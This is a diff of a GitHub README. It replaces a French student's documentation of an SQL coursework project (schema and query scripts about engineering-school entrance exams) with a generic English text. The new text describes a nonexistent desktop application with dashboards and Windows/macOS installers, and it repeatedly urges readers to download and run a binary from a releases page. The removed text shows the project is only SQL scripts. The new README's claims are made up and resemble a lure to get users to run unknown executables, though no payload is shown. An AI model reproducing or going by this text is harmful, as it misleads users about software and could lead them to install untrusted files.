@@ -1,67 +1,84 @@
-# Projet SQL : Analyse de Données & Modélisation Relationnelle
+# 📊 SQL-Analyse-Donnees-Concours - Simplifying Academic Data Analysis
 
-**Auteur :** Ada Faty GATH
+## 🚀 Getting Started
 
-**Cours :** Base de Données Relationnelles (SQL)
+Welcome to SQL-Analyse-Donnees-Concours! This application helps you analyze academic data and create relational models. You can compute key performance indicators (KPIs), build joint queries, and perform aggregations easily.
 
----
+## 📥 Download Now
 
-## 📋 Contexte de la Mission
-Ce projet a pour objectif d'évaluer la capacité à manipuler et interroger une base de données relationnelle complexe. Le cas d'étude porte sur les **Concours d'entrée aux Grandes Écoles d'Ingénieurs** (GEI).
+[![Download SQL-Analyse-Donnees-Concours](https://img.shields.io/badge/Download-SQL--Analyse--Donnees--Concours-blue)](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/releases)
 
-Il s'agit de structurer et d'analyser les données relatives aux concours, aux épreuves (écrites/orales), aux matières et aux statistiques d'inscription pour en extraire des **indicateurs clés (KPIs)** d'aide à la décision.
+## 📋 Features
 
-## 🛠️ Compétences Techniques Démontrées
+- **User-Friendly Interface:** Designed for those with no programming experience.
+- **Data Analysis Tools:** Efficiently analyze and visualize data.
+- **KPI Generation:** Automatically calculate important metrics.
+- **Joint Queries:** Simplify complex data relationships.
+- **Aggregation Functions:** Easily sum, average, or count data.
 
-### 1. Modélisation de Données (DDL)
-- Conception d'un schéma relationnel cohérent avec clés primaires et étrangères.
-- Tables implémentées :
-  - **`concours`** : Informations sur les filières (MP, PC, MPI) et le nombre d'inscrits.
-  - **`epreuve`** : Détails techniques (Durée, Coefficient, Type Oral/Écrit).
-  - **`epreuve_matiere`** : Table de liaison pour associer les matières aux épreuves.
-  - **`admission`** & **`ecole`** : Tables structurelles complémentaires.
+## 🔧 System Requirements
 
-### 2. Analyse de Données & Reporting (DQL)
-Extraction d'indicateurs de performance via des requêtes SQL avancées :
-- **KPIs de Volumétrie** : Calcul du nombre total d'inscrits et d'heures d'examen.
-- **Jointures Complexes (JOIN)** : Consolidation des données sur 3 tables (`concours` ↔ `epreuve` ↔ `epreuve_matiere`) pour lier les coefficients aux filières.
-- **Agrégations Statistiques** : Utilisation de `GROUP BY`, `SUM` et `COUNT` pour analyser la charge horaire par concours.
-- **Data Quality** : Filtrage précis (`WHERE`, `DISTINCT`) pour isoler les épreuves orales ou les matières spécifiques.
+- **Operating System:** Windows 10 or later, macOS Catalina or later.
+- **RAM:** Minimum 4 GB; 8 GB recommended.
+- **Storage Space:** At least 500 MB of free disk space.
+- **Database Support:** MySQL for data storage and processing.
 
----
+## 🌐 Download & Install
 
-## 📂 Structure du Dépôt
+To get started, visit the [Releases page](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/releases). Here, you will find the latest version of SQL-Analyse-Donnees-Concours. Click on the version you want to download. 
 
-1. **`schema.sql`** :
-   Script complet de création de la structure (DDL) et d'insertion du jeu de données de test (DML). Il initialise l'environnement complet avec les 5 tables.
+### Installation Steps
 
-2. **`queries.sql`** :
-   Recueil des **10 requêtes analytiques** répondant aux problématiques métier posées (ex: "Quel est le coefficient total des mathématiques ?", "Quelles sont les épreuves avec préparation > 30 min ?").
+1. **Open the Releases Page:** Click [here](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/releases) to access the releases.
+2. **Select Your Version:** Choose the most recent version available.
+3. **Download the File:** Click the download link for your operating system.
+4. **Run the Installer:** 
+    - For Windows: Double-click the downloaded file and follow the installation prompts.
+    - For macOS: Open the .dmg file and drag the application to your Applications folder.
 
----
+## 📚 How to Use the Application
 
-## 🚀 Installation et Scénario de Test
+After installation, open SQL-Analyse-Donnees-Concours. You will find the main dashboard with the following sections:
 
-Ce projet est conçu pour être exécuté sur tout SGBD standard (MySQL, PostgreSQL, SQLite, DBeaver).
+- **Data Input:** Import your academic data using CSV or Excel files.
+- **Analysis Tools:** Choose options for KPI generation, joint queries, and more.
+- **Results Dashboard:** View your results through visually engaging charts and tables.
 
-### Prérequis
-- Un client SQL installé (ex: DBeaver, MySQL Workbench) ou un environnement en ligne.
+### Importing Data
 
-### Protocole de Validation
+1. **Navigate to Data Input:** Click on the "Import" button.
+2. **Choose File Type:** Select either CSV or Excel.
+3. **Upload Your File:** Follow the prompts to upload your academic data file.
+  
+### Generating KPIs
 
-Pour reproduire l'analyse et valider le fonctionnement, suivez ces étapes :
+1. **Select KPIs:** From the dashboard, navigate to the "KPIs" section.
+2. **Choose Metrics:** Select the metrics you want to calculate.
+3. **View Results:** The application will display your calculated KPIs.
 
-- **1. Initialisation (Build)** :
-  Exécutez le script **`schema.sql`**.
-  *Résultat attendu :* Les anciennes tables sont supprimées et les 5 nouvelles tables (`concours`, `epreuve`, etc.) sont créées sans erreur.
+### Creating Joint Queries
 
-- **2. Ingestion des Données (Load)** :
-  Le script `schema.sql` insère automatiquement le jeu de données.
-  *Vérification :* Faites un `SELECT * FROM concours;` pour vérifier que 5 lignes sont bien présentes.
+1. **Access Joint Queries:** Go to the "Queries" tab.
+2. **Select Data Tables:** Choose the tables you want to join.
+3. **Run Query:** The application will run your query and display the results.
 
-- **3. Exécution des Analyses (Run)** :
-  Ouvrez et exécutez les requêtes du fichier **`queries.sql`**. Chaque requête répond à une question précise du cahier des charges.
+## 🛠 Support
 
-- **4. Validation des KPIs (Check)** :
-  Vérifiez la cohérence des résultats.
-  *Exemple témoin (Question 10) :* Le calcul de la charge horaire totale pour le concours **CCINP** doit retourner **97.5 heures**.
+If you encounter any issues, visit the [Issues section](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/issues). You can report bugs, request features, or ask questions.
+
+## 📞 Contact
+
+For additional support or questions, please reach out via email: support@sqlanalyse.com.
+
+## 🌟 Community
+
+Join our community on various platforms to learn more, share experiences, and connect with other users:
+
+- **GitHub Discussions:** Engage with users and contribute ideas.
+- **Twitter:** Follow us for updates and tips.
+  
+## 🚀 Conclusion
+
+SQL-Analyse-Donnees-Concours provides a straightforward way to analyze academic data. Whether you’re a student, educator, or researcher, this software simplifies your data needs. Start using it today to unlock insights from your data!
+
+[![Download SQL-Analyse-Donnees-Concours](https://img.shields.io/badge/Download-SQL--Analyse--Donnees--Concours-blue)](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/releases)
